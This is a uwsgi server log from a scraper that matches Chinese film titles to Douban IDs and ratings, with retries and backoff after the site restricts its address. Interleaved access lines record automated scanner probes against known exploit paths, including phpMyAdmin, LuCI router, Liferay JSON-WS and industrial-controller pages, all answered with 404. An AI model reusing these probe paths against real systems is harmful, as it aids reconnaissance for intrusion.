[1590768001] ./uwsgi.log reopened.
墨斗先生 1483446 7.0保存成功[douban]
男上女下 1308791 6.1保存成功[douban]
密情追踪 11612498 0保存成功[douban]
珍珠衫 4275583 5.6保存成功[douban]
珍珠衫 4275583 5.6保存成功[douban]
爱在日落黄昏时 未匹配到合适id
----------地址被限制,稍后重试----------
撞车 1388216 8.6保存成功[douban]
恋爱中的宝贝 1308746 6.2保存成功[douban]
黑道少林 4127193 3.9保存成功[douban]
生死速递 1308700 5.5保存成功[douban]
飞鹰 1307186 5.2保存成功[douban]
花好月圆 1308827 6.1保存成功[douban]
乌龙小子流浪记 2136872 7.3保存成功[douban]
甜丝丝 1774999 6.0保存成功[douban]
食人狂魔 未匹配到合适id
----------地址被限制,稍后重试----------
大公司小老板 1389918 6.7保存成功[douban]
我要做Model 1370237 5.7保存成功[douban]
最后的爱，最初的爱 1451413 6.3保存成功[douban]
五月之恋 1422086 6.8保存成功[douban]
辣手学子 20470107 0保存成功[douban]
百万美元宝贝 1309016 8.7保存成功[douban]
红杏劫 5403938 7.0保存成功[douban]
暗流2：末日天使 1308790 6.6保存成功[douban]
五世同堂 未匹配到合适id
----------地址被限制,稍后重试----------
可可西里 1308857 8.8保存成功[douban]
拜见岳父大人2 1308987 7.1保存成功[douban]
虚构谋杀 24846284 0保存成功[douban]
天音琴魔 3264842 0保存成功[douban]
我只在乎你 5045800 6.8保存成功[douban]
帝国的毁灭 1309115 8.7保存成功[douban]
无人知晓 1292337 9.1保存成功[douban]
杀死比尔2 匹配到多个豆瓣id数据，存入列表2 ['1291584', '10777078']
雪谷逃生 未匹配到合适id
----------地址被限制,稍后重试----------
none_list2 暂存
摇摆少女 1361254 8.3保存成功[douban]
蒙娜丽莎的微笑 未匹配到合适id
蒙娜丽莎的微笑 无豆瓣id数据，存入列表
灵魂歌王 1309085 8.4保存成功[douban]
猎杀活死人 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
尼罗河上的惨案 1427034 8.4保存成功[douban]
丛林奇兵 未匹配到合适id
丛林奇兵 无豆瓣id数据，存入列表
总统接招 1309169 6.4保存成功[douban]
夹心蛋糕 1309185 7.1保存成功[douban]
双狙人3 1340361 6.4保存成功[douban]
外来媳妇本地郎 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
尼伯龙根的指环 1337287 7.0保存成功[douban]
A-1头条 1388177 6.0保存成功[douban]
哥鲁达 2158954 4.0保存成功[douban]
温布尔登 1308763 6.8保存成功[douban]
隐剑鬼爪 1309005 8.2保存成功[douban]
再造人卡辛 1452121 5.9保存成功[douban]
整十码 1298737 6.3保存成功[douban]
花与爱丽丝 1308820 8.1保存成功[douban]
贱女孩 匹配到多个豆瓣id数据，存入列表2 ['1309084', '26732589']
新婚告急2004 未匹配到合适id
----------地址被限制,稍后重试----------
none_list2 暂存
借着雨点说爱你 1395080 8.5保存成功[douban]
马粥街残酷史 1395231 7.9保存成功[douban]
请别相信她 1428421 7.1保存成功[douban]
生化危机2：启示录 1308752 7.8保存成功[douban]
遇见波莉 1308197 6.4保存成功[douban]
小可爱 1308778 7.9保存成功[douban]
BJ单身日记2：理性边缘 1308819 7.2保存成功[douban]
反恐特警组 未匹配到合适id
----------地址被限制,稍后重试----------
[pid: 24504|app: 0|req: 285/352] 195.54.160.130 () {38 vars in 610 bytes} [Sat May 30 00:28:53 2020] POST /api/jsonws/invoke => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
战栗汪洋 未匹配到合适id
战栗汪洋 无豆瓣id数据，存入列表
在我父亲的洞穴里 1309127 7.7保存成功[douban]
哥斯拉之终极战役 1422931 6.5保存成功[douban]
后天 匹配到多个豆瓣id数据，存入列表2 ['1308779', '2997412']
真爱的诠释 未匹配到合适id
真爱的诠释 无豆瓣id数据，存入列表
飞虎雄师6之救世者 未匹配到合适id
飞虎雄师6之救世者 无豆瓣id数据，存入列表
飞虎雄师5之复仇 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
飞虎雄师2之中环茶室凶杀案 未匹配到合适id
飞虎雄师2之中环茶室凶杀案 无豆瓣id数据，存入列表
飞虎雄师3之边缘人 未匹配到合适id
飞虎雄师3之边缘人 无豆瓣id数据，存入列表
飞虎雄师7之点指兵兵 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
飞虎雄师9之再战江湖 未匹配到合适id
飞虎雄师9之再战江湖 无豆瓣id数据，存入列表
千尸屋 未匹配到合适id
千尸屋 无豆瓣id数据，存入列表
大逃杀2 1299711 5.3保存成功[douban]
私法行动 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
天地无限 1305964 7.9保存成功[douban]
尘雾家园 1307786 7.8保存成功[douban]
龙城正月 未匹配到合适id
龙城正月 无豆瓣id数据，存入列表
水世界 1316532 5.5保存成功[douban]
老男孩2003 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
潜龙轰天3野兽之腹 未匹配到合适id
----------地址被限制,稍后重试----------
冰雪勇士 未匹配到合适id
----------地址被限制,稍后重试----------
佛莱迪对杰森 未匹配到合适id
----------地址被限制,稍后重试----------
浪漫刺客 未匹配到合适id
----------地址被限制,稍后重试----------
[pid: 24504|app: 0|req: 286/353] 31.186.46.6 () {32 vars in 462 bytes} [Sat May 30 00:53:39 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
连续五次失败，等待30分钟
----------重新启动查找------------
幸福捷径 未匹配到合适id
----------地址被限制,稍后重试----------
X战警2 未匹配到合适id
----------地址被限制,稍后重试----------
11:14 未匹配到合适id
----------地址被限制,稍后重试----------
暖 未匹配到合适id
----------地址被限制,稍后重试----------
童僧 未匹配到合适id
----------地址被限制,稍后重试----------
-----连续十次失败，等待1小时-----
[pid: 24504|app: 0|req: 287/354] 182.254.52.17 () {36 vars in 550 bytes} [Sat May 30 01:41:38 2020] GET /0bef => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
[pid: 24504|app: 0|req: 288/355] 162.243.138.64 () {34 vars in 394 bytes} [Sat May 30 01:41:51 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
[pid: 24504|app: 0|req: 289/356] 128.14.133.58 () {34 vars in 487 bytes} [Sat May 30 01:53:35 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
[pid: 24504|app: 0|req: 290/357] 61.241.50.63 () {36 vars in 581 bytes} [Sat May 30 02:04:17 2020] GET /phpmyadmin/index.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
[pid: 24504|app: 0|req: 291/358] 182.254.52.17 () {36 vars in 566 bytes} [Sat May 30 02:19:45 2020] GET /client_area/ => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
[pid: 24504|app: 0|req: 292/359] 103.145.12.53 () {34 vars in 402 bytes} [Sat May 30 02:24:01 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
死里逃生 未匹配到合适id
----------地址被限制,稍后重试----------
速度与激情2 未匹配到合适id
----------地址被限制,稍后重试----------
光彩年华 未匹配到合适id
----------地址被限制,稍后重试----------
的士速递3 未匹配到合适id
----------地址被限制,稍后重试----------
闪亮的日子 未匹配到合适id
----------地址被限制,稍后重试----------
连续五次失败，等待30分钟
----------重新启动查找------------
八小时意外 未匹配到合适id
----------地址被限制,稍后重试----------
加勒比海盗1：黑珍珠号的诅咒 未匹配到合适id
----------地址被限制,稍后重试----------
太阳泪 未匹配到合适id
----------地址被限制,稍后重试----------
好死不如赖活着 未匹配到合适id
----------地址被限制,稍后重试----------
中国功夫少女组 未匹配到合适id
----------地址被限制,稍后重试----------
-----连续十次失败，等待1小时-----
黑客帝国2：重装上阵 未匹配到合适id
----------地址被限制,稍后重试----------
黑客帝国3：矩阵革命 未匹配到合适id
----------地址被限制,稍后重试----------
憨豆特工 未匹配到合适id
----------地址被限制,稍后重试----------
新笑林小子之我最棒 未匹配到合适id
----------地址被限制,稍后重试----------
举起手来 未匹配到合适id
----------地址被限制,稍后重试----------
连续五次失败，等待30分钟
[pid: 24504|app: 0|req: 293/360] 182.254.52.17 () {36 vars in 588 bytes} [Sat May 30 04:55:54 2020] GET /streaming/CVU6z92KB.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
----------重新启动查找------------
古墓丽影2 未匹配到合适id
----------地址被限制,稍后重试----------
指环王3：王者无敌 未匹配到合适id
----------地址被限制,稍后重试----------
无间道2 未匹配到合适id
----------地址被限制,稍后重试----------
无间道3：终极无间 未匹配到合适id
----------地址被限制,稍后重试----------
杀人回忆 未匹配到合适id
----------地址被限制,稍后重试----------
-----连续十次失败，等待1小时-----
[pid: 24504|app: 0|req: 294/361] 182.254.52.17 () {36 vars in 592 bytes} [Sat May 30 06:31:28 2020] GET /video/play/82978/1-3.html => generated 19553 bytes in 10 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 1)
条子骇客 1849410 6.9保存成功[douban]
致命弯道1 未匹配到合适id
致命弯道1 无豆瓣id数据，存入列表
情欲印象 1308444 6.4保存成功[douban]
惊心食人族2 1308046 6.4保存成功[douban]
丑闻：朝鲜男女相悦之事 未匹配到合适id
丑闻：朝鲜男女相悦之事 无豆瓣id数据，存入列表
少女惊魂 2132767 4.6保存成功[douban]
死神来了2 1307956 7.4保存成功[douban]
不散 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
恋上你的床 1308520 5.8保存成功[douban]
心寒 1300984 5.5保存成功[douban]
行运超人 1306334 6.7保存成功[douban]
新扎师姐2：不安全地带 4006652 4.0保存成功[douban]
咒怨2 1308554 7.4保存成功[douban]
鬼来电1 未匹配到合适id
鬼来电1 无豆瓣id数据，存入列表
飞龙再生 1308110 5.9保存成功[douban]
上海正午2：上海骑士 1307675 6.5保存成功[douban]
千机变 1307740 5.8保存成功[douban]
醉马骝 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
防弹武僧 1303693 5.3保存成功[douban]
大块头有大智慧 1300359 6.6保存成功[douban]
双雄 1308482 6.4保存成功[douban]
惊涛骇浪 未匹配到合适id
惊涛骇浪 无豆瓣id数据，存入列表
金鸡2 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
老鼠爱上猫 1307849 5.6保存成功[douban]
赌侠之人定胜天 1775450 5.6保存成功[douban]
忘不了 1308749 7.7保存成功[douban]
安娜与武林 1308866 5.1保存成功[douban]
玉观音 匹配到多个豆瓣id数据，存入列表2 ['2248526', '1308745']
地心抢险记 1300092 6.7保存成功[douban]
失忆界女王 1302769 6.2保存成功[douban]
迷失东京 1291835 7.7保存成功[douban]
神秘河 未匹配到合适id
----------地址被限制,稍后重试----------
none_list2 暂存
[pid: 24504|app: 0|req: 295/362] 183.136.225.57 () {34 vars in 456 bytes} [Sat May 30 06:52:56 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
三十八度 1476912 6.2保存成功[douban]
花魁杜十娘 1424746 5.4保存成功[douban]
情牵一线 1308798 6.5保存成功[douban]
妖夜回廊 1308040 6.2保存成功[douban]
新扎师妹2 1308232 6.6保存成功[douban]
灿烂人生 1291831 9.4保存成功[douban]
紫蝴蝶 1303217 6.7保存成功[douban]
恋之风景 1308672 6.8保存成功[douban]
百分百感觉2003 1308615 6.1保存成功[douban]
终结者3 未匹配到合适id
----------地址被限制,稍后重试----------
冒牌天神 1297018 7.6保存成功[douban]
大鱼 1291545 8.8保存成功[douban]
炮制女朋友 1305926 4.6保存成功[douban]
见习黑玫瑰 未匹配到合适id
见习黑玫瑰 无豆瓣id数据，存入列表
向左走．向右走 1308587 6.9保存成功[douban]
卡拉是条狗 1308573 7.3保存成功[douban]
警察有约 1456774 7.4保存成功[douban]
大丈夫 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
爆裂神探 未匹配到合适id
爆裂神探 无豆瓣id数据，存入列表
绝种好男人 1388196 5.8保存成功[douban]
某年某月某日 3241951 6.6保存成功[douban]
月光游侠 1308523 7.1保存成功[douban]
手机 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
三言两拍之炼金术 10777698 0保存成功[douban]
剧场版 假面骑士555 消失的天堂 4122174 8.4保存成功[douban]
我心中的朱丽叶 5279628 0保存成功[douban]
绿茶 1308699 6.2保存成功[douban]
天地英雄 匹配到多个豆瓣id数据，存入列表2 ['1302705', '5370358']
飘扬的红领巾 6844906 0保存成功[douban]
给他们一个机会 1302885 6.2保存成功[douban]
二弟 未匹配到合适id
----------地址被限制,稍后重试----------
none_list2 暂存
力王中王 4821044 3.5保存成功[douban]
假如爱有天意 1304073 8.4保存成功[douban]
少年往事 1460888 7.8保存成功[douban]
生活秀 未匹配到合适id
生活秀 无豆瓣id数据，存入列表
关中刀客之董二伯 1484668 7.5保存成功[douban]
竹叶青传奇 3008814 0保存成功[douban]
关中刀客之黑脊背 1484673 7.8保存成功[douban]
关中刀客之愤操子 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
座头市 1300752 8.0保存成功[douban]
无敌拳王 26729338 0保存成功[douban]
回归 1308074 8.7保存成功[douban]
杀死比尔1 未匹配到合适id
杀死比尔1 无豆瓣id数据，存入列表
关中刀客之虎头 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
关中刀客之花翎子 1484667 7.9保存成功[douban]
关中刀客之拚镢子 1484663 8.4保存成功[douban]
关中刀客之仁厨子 1484670 7.4保存成功[douban]
关中刀客之七寸子 1484672 6.8保存成功[douban]
关中刀客之肉瓤子 1484671 7.8保存成功[douban]
关中刀客之鹞子龙五 1484666 7.1保存成功[douban]
拳王 1308713 7.8保存成功[douban]
游泳池 1307427 7.4保存成功[douban]
西柏林恋曲 1417044 7.3保存成功[douban]
圣诞坏公公 未匹配到合适id
----------地址被限制,稍后重试----------
猛鬼街8：佛莱迪大战杰森 未匹配到合适id
猛鬼街8：佛莱迪大战杰森 无豆瓣id数据，存入列表
热舞甜心 1308709 7.3保存成功[douban]
请你闭嘴 1303815 8.1保存成功[douban]
绝地战警2 1307917 7.5保存成功[douban]
鬼魅 1308047 7.2保存成功[douban]
惊声尖笑3 1301861 6.8保存成功[douban]
寻爱之旅 未匹配到合适id
寻爱之旅 无豆瓣id数据，存入列表
火爆警探 25802437 0保存成功[douban]
伯尔尼的奇迹 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
[pid: 24504|app: 0|req: 296/363] 61.241.50.63 () {36 vars in 555 bytes} [Sat May 30 07:23:22 2020] GET /api.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
美国派3：美国婚礼 1308429 7.0保存成功[douban]
超胆侠 匹配到多个豆瓣id数据，存入列表2 ['1307311', '5165487']
霹雳娇娃2 1297003 6.6保存成功[douban]
摇滚校园 1308620 7.8保存成功[douban]
托斯卡尼艳阳下 1307052 8.1保存成功[douban]
我的老婆是大佬2 1308050 6.0保存成功[douban]
清风明月 1302820 5.8保存成功[douban]
基地疑云 1301164 6.9保存成功[douban]
失控陪审团 1307493 8.0保存成功[douban]
新婚告急2003 未匹配到合适id
----------地址被限制,稍后重试----------
none_list2 暂存
特种部队2003 未匹配到合适id
特种部队2003 无豆瓣id数据，存入列表
跳跃大搜查线2 1422883 7.7保存成功[douban]
地狱醒龙 1303397 6.9保存成功[douban]
凯利帮 1307309 6.5保存成功[douban]
血色月亮 1309194 6.9保存成功[douban]
新郎上错床 1307530 5.7保存成功[douban]
国家保安 1306805 6.4保存成功[douban]
飞虎雄师 1788004 5.7保存成功[douban]
黑侠2 1306935 5.0保存成功[douban]
极地营救 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
致命性骚扰 1305985 4.7保存成功[douban]
35米厘：凶心人 1473289 5.7保存成功[douban]
巅峰杀戮 1307386 6.8保存成功[douban]
夺面解码 未匹配到合适id
夺面解码 无豆瓣id数据，存入列表
赤裸特工 未匹配到合适id
赤裸特工 无豆瓣id数据，存入列表
夕阳天使 1300608 6.6保存成功[douban]
闪灵战士 1295875 6.5保存成功[douban]
杀手公司 未匹配到合适id
杀手公司 无豆瓣id数据，存入列表
杀出个黎明2 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
双瞳 匹配到多个豆瓣id数据，存入列表2 ['1305046', '3126559']
双瞳 未匹配到合适id
----------地址被限制,稍后重试----------
none_list2 暂存
失眠症 未匹配到合适id
----------地址被限制,稍后重试----------
战栗空间 未匹配到合适id
----------地址被限制,稍后重试----------
猫鼠游戏 未匹配到合适id
----------地址被限制,稍后重试----------
英雄2002 未匹配到合适id
----------地址被限制,稍后重试----------
连续五次失败，等待30分钟
[pid: 24504|app: 0|req: 297/364] 168.181.120.21 () {32 vars in 464 bytes} [Sat May 30 07:55:48 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
[pid: 24504|app: 0|req: 298/365] 61.241.50.63 () {36 vars in 613 bytes} [Sat May 30 08:11:56 2020] GET /142f72019210affb5fdb61780df96e63.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
----------重新启动查找------------
热血青年 1304243 6.4保存成功[douban]
心慌方2：超立方体 1305306 6.8保存成功[douban]
色即是空1 未匹配到合适id
色即是空1 无豆瓣id数据，存入列表
爱·回家 1299361 9.1保存成功[douban]
不可撤销2002 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
西蒙妮 1306795 7.3保存成功[douban]
雪地狂奔 1306212 7.3保存成功[douban]
终极斗士 1300139 6.7保存成功[douban]
上帝之城 1292208 8.9保存成功[douban]
星际旅行10：复仇女神 1296702 7.0保存成功[douban]
惊变28天 1306421 7.1保存成功[douban]
狙击电话亭 1303246 7.9保存成功[douban]
指环王2：双塔奇兵 1291572 9.1保存成功[douban]
咒怨 未匹配到合适id
----------地址被限制,稍后重试----------
无间道 1307914 9.2保存成功[douban]
玩命快递 1303139 7.3保存成功[douban]
和你在一起 1307702 7.8保存成功[douban]
星球大战前传2：克隆人的进攻 1297785 7.9保存成功[douban]
黑衣人2 匹配到多个豆瓣id数据，存入列表2 ['1295280', '34857339', '5123760', '34861254', '34861251']
风语战士 1295120 7.6保存成功[douban]
007之择日而亡 1303773 7.2保存成功[douban]
见鬼 1296026 7.2保存成功[douban]
蜘蛛侠1 未匹配到合适id
----------地址被限制,稍后重试----------
none_list2 暂存
非常凶姐 1303013 5.3保存成功[douban]
英雄 1306123 7.4保存成功[douban]
河东狮吼 1305265 6.8保存成功[douban]
钢琴家 匹配到多个豆瓣id数据，存入列表2 ['1296736', '3067854']
哈特之战 1306444 7.5保存成功[douban]
神奇燕尾服 1305183 6.3保存成功[douban]
卫斯理之蓝血人 1306983 5.3保存成功[douban]
丰胸秘CUP 1302278 5.3保存成功[douban]
风流家族 未匹配到合适id
----------地址被限制,稍后重试----------
none_list2 暂存
绝世宝贝 1299035 5.8保存成功[douban]
当男人变成女人 1300389 5.4保存成功[douban]
巴尔扎克与小裁缝 1296769 7.9保存成功[douban]
干柴烈火 1303674 6.5保存成功[douban]
幽灵人间II:鬼味人间 1307926 6.3保存成功[douban]
变脸迷情 1301968 5.6保存成功[douban]
悭钱家族 1303156 6.3保存成功[douban]
贱精先生 1304977 6.3保存成功[douban]
天下无双 匹配到多个豆瓣id数据，存入列表2 ['1307323', '5262086']
魂魄唔齐 未匹配到合适id
----------地址被限制,稍后重试----------
none_list2 暂存
新扎师妹 1308655 7.7保存成功[douban]
想飞 1306916 6.7保存成功[douban]
恋爱行星 1307706 6.9保存成功[douban]
谍影重重 1304102 8.6保存成功[douban]
少数派报告 1297689 7.8保存成功[douban]
一碌蔗 1307876 6.8保存成功[douban]
天使不寂寞 1812762 7.4保存成功[douban]
横行霸盗 2979538 5.9保存成功[douban]
冲出亚马逊 未匹配到合适id
----------地址被限制,稍后重试----------
杀手狂龙 1306175 5.1保存成功[douban]
我老婆未满十八岁 1300246 6.5保存成功[douban]
九个女仔一只鬼 1494897 6.3保存成功[douban]
猪扒大联盟 1308616 6.1保存成功[douban]
回归者 1307413 6.4保存成功[douban]
枕边凶灵 1302162 5.8保存成功[douban]
Office有鬼 1307807 6.7保存成功[douban]
无问题2 2004250 5.8保存成功[douban]
蜘蛛梦魇 1305408 7.3保存成功[douban]
手足情 未匹配到合适id
----------地址被限制,稍后重试----------
[pid: 24504|app: 0|req: 299/366] 180.167.210.6 () {30 vars in 339 bytes} [Sat May 30 08:47:25 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
[pid: 24507|app: 0|req: 52/367] 180.167.210.6 () {30 vars in 369 bytes} [Sat May 30 08:47:26 2020] GET /navigation.html => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
[pid: 24505|app: 0|req: 8/368] 180.167.210.6 () {30 vars in 339 bytes} [Sat May 30 08:47:26 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
[pid: 24505|app: 0|req: 9/369] 180.167.210.6 () {30 vars in 339 bytes} [Sat May 30 08:47:26 2020] GET / => generated 179 bytes in 0 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
[pid: 24504|app: 0|req: 300/370] 180.167.210.6 () {30 vars in 363 bytes} [Sat May 30 08:47:27 2020] GET /KingViewWeb/ => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
[pid: 24505|app: 0|req: 10/371] 180.167.210.6 () {30 vars in 365 bytes} [Sat May 30 08:47:28 2020] GET /webconfig.ini => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
[pid: 24504|app: 0|req: 301/372] 180.167.210.6 () {30 vars in 339 bytes} [Sat May 30 08:47:28 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
[pid: 24507|app: 0|req: 53/373] 180.167.210.6 () {30 vars in 422 bytes} [Sat May 30 08:47:29 2020] GET /fx_plcinf.html?CMD=Monitor%20Start&LANG=EN => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
[pid: 24507|app: 0|req: 54/374] 180.167.210.6 () {30 vars in 365 bytes} [Sat May 30 08:47:29 2020] GET /ifixwebspace/ => generated 179 bytes in 2 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
[pid: 24506|app: 0|req: 11/375] 180.167.210.6 () {30 vars in 339 bytes} [Sat May 30 08:47:30 2020] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 0)
[pid: 24504|app: 0|req: 302/376] 180.167.210.6 () {42 vars in 797 bytes} [Sat May 30 08:47:31 2020] POST /cgi-bin/luci/;stok=/locale?form=lang => generated 179 bytes in 1 msecs (HTTP/1.1 404) 4 headers in 128 bytes (1 switches on core 1)
天上的恋人 1306631 7.4保存成功[douban]
那时花开 1308480 7.0保存成功[douban]
少年赌圣 3892489 3.6保存成功[douban]
黑侠VS赌圣 4603516 3.6保存成功[douban]
日本少林 25980040 0保存成功[douban]
夺宝英雄 5178802 4.5保存成功[douban]
嫁个有钱人 1305713 5.9保存成功[douban]
天荒情未老 1299185 6.1保存成功[douban]
天荒情未老 未匹配到合适id
----------地址被限制,稍后重试----------
欲海星沉 19966592 0保存成功[douban]
我爱一碌葛 3681614 5.8保存成功[douban]
一本未完的漫画 3558657 4.2保存成功[douban]
神屁太空人 1891815 6.8保存成功[douban]
改编剧本 1302193 7.6保存成功[douban]
蓝色大门 1308575 8.3保存成功[douban]
凶宅幽灵 2080503 3.5保存成功[douban]
西施眼 1437856 7.7保存成功[douban]
寻枪 未匹配到合适id
----------地址被限制,稍后重试----------
极度险情 2377247 6.5保存成功[douban]
爱情钥匙 1464676 6.6保存成功[douban]
枪手 1937203 6.3保存成功[douban]
僵尸奖门人 4202073 3.9保存成功[douban]
力王之黑色擂台 3861761 3.6保存成功[douban]
疾风铁男 4127216 0保存成功[douban]
弗里达 1291852 8.7保存成功[douban]
薯唛大贼 1306943 6.5保存成功[douban]
大麻烦 未匹配到合适id
----------地址被限制,稍后重试----------
模仿犯 1296514 6.0保存成功[douban]
秘书 1307490 7.1保存成功[douban]
机动警察剧场版3 未匹配到合适id
机动警察剧场版3 无豆瓣id数据，存入列表
猛鬼追魂06 死亡代码 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
2009迷失的记忆 1300149 6.7保存成功[douban]
中毒 1308491 7.1保存成功[douban]
双狙人2 1308260 6.7保存成功[douban]
世界上最疼我的那个人去了 1316565 8.4保存成功[douban]
五月八月 1306929 7.8保存成功[douban]
惊天核网 1306969 6.8保存成功[douban]
黄昏的清兵卫 1307306 8.8保存成功[douban]
直击要害 未匹配到合适id
----------地址被限制,稍后重试----------
时时刻刻 1305666 8.6保存成功[douban]
极度重罪 1306915 6.9保存成功[douban]
天兆 1298328 6.5保存成功[douban]
美丽新世界2之女王任务 未匹配到合适id
美丽新世界2之女王任务 无豆瓣id数据，存入列表
幽灵船 1296535 6.8保存成功[douban]
生化危机 未匹配到合适id
生化危机 无豆瓣id数据，存入列表
青涩恋爱 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
买凶拍人 1300616 8.2保存成功[douban]
狼族盟约 1301119 6.6保存成功[douban]
拳神传说 未匹配到合适id
拳神传说 无豆瓣id数据，存入列表
爆火线 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
异形魔怪3 2052367 5.8保存成功[douban]
曼尼山夺宝记 未匹配到合适id
曼尼山夺宝记 无豆瓣id数据，存入列表
天才一族.2001 未匹配到合适id
天才一族.2001 无豆瓣id数据，存入列表
侏罗纪公园3 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
速度与激情1 未匹配到合适id
速度与激情1 无豆瓣id数据，存入列表
火星幽灵 1301939 5.4保存成功[douban]
大腕 1304022 7.8保存成功[douban]
特务迷城 匹配到多个豆瓣id数据，存入列表2 ['1302242', '33456213']
公主日记 1305065 7.5保存成功[douban]
宇宙追缉令 1305067 6.1保存成功[douban]
黑鹰坠落 1291824 8.7保存成功[douban]
古墓丽影1 未匹配到合适id
古墓丽影1 无豆瓣id数据，存入列表
指环王1：魔戒再现 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
none_list2 暂存
绿芥刑警 未匹配到合适id
----------地址被限制,稍后重试----------
龙之吻 未匹配到合适id
----------地址被限制,稍后重试----------
迁徙的鸟 未匹配到合适id
----------地址被限制,稍后重试----------
木乃伊归来 未匹配到合适id
----------地址被限制,稍后重试----------
连续五次失败，等待30分钟
[pid: 24504|app: 0|req: 303/377] 182.254.52.17 () {36 vars in 592 bytes} [Sat May 30 09:58:40 2020] GET /video/play/82978/1-7.html => generated 19553 bytes in 9 msecs (HTTP/1.1 200) 6 headers in 320 bytes (1 switches on core 1)
----------重新启动查找------------
兵临城下 1301726 8.5保存成功[douban]
人头豆腐汤 未匹配到合适id
人头豆腐汤 无豆瓣id数据，存入列表
杀手阿一 1295629 7.4保存成功[douban]
蜀山传 1308338 6.7保存成功[douban]
杀手假期 未匹配到合适id
----------地址被限制,稍后重试----------
none_list 暂存
走投有路 1578572 6.3保存成功[douban]
不死情谜 1308558 6.3保存成功[douban]
决战猩球 匹配到多个豆瓣id数据，存入列表2 ['1304338', '6425302']
爱君如梦 1304989 6.7保存成功[douban]
尖峰时刻2 1304642 6.9保存成功[douban]
瘦身男女 1303203 6.8保存成功[douban]
高原如梦 3012368 8.4保存成功[douban]
恐怖热线之大头怪婴 未匹配到合适id
----------地址被限制,稍后重试----------
none_list2 暂存
废柴同盟 1433699 6.5保存成功[douban]
爱情白面包 1305352 6.4保存成功[douban]
全职杀手 1296169 6.8保存成功[douban]
绝世好Bra 1306319 5.8保存成功[douban]
九龙冰室 1307922 6.7保存成功[douban]
逆天者 1479112 7.4保存成功[douban]
穆赫兰道 1292217 8.4保存成功[douban]
天士梦 未匹配到合适id
----------地址被限制,稍后重试----------
情迷大话王 1417543 6.0保存成功[douban]
芭啦芭啦樱之花 1298346 6.1保存成功[douban]
一个烂赌的传说 1419993 7.9保存成功[douban]
喜欢您 1903672 6.5保存成功[douban]
薰衣草 2270536 6.8保存成功[douban]
幽灵人间 1302638 6.2保存成功[douban]
北京乐与路 1298213 7.1保存成功[douban]
靓女差馆 1771944 5.2保存成功[douban]
常在我心 1353725 7.6保存成功[douban]
百分百感觉2 1302060 6.4保存成功[douban]
训练日 未匹配到合适id
----------地址被限制,稍后重试----------
4X100 水着份子 1388233 5.3保存成功[douban]
知法犯法 1302812 6.7保存成功[douban]
游园惊梦 匹配到多个豆瓣id数据，存入列表2 ['1304708', '1916385']
头号人物 1484236 6.5保存成功[douban]
老夫子2001 1295782 5.9保存成功[douban]
恋爱起义 1299704 7.0保存成功[douban]
蓝宇 1308076 8.3保存成功[douban]
有人说爱我 1806722 6.0保存成功[douban]
慌心假期 1308275 7.6保存成功[douban]
玉女添丁 未匹配到合适id
----------地址被限制,稍后重试----------
none_list2 暂存
李秋实 26362206 0保存成功[douban]
初恋的故事 1937214 6.2保存成功[douban]
苹果的滋味 1441902 5.2保存成功[douban]
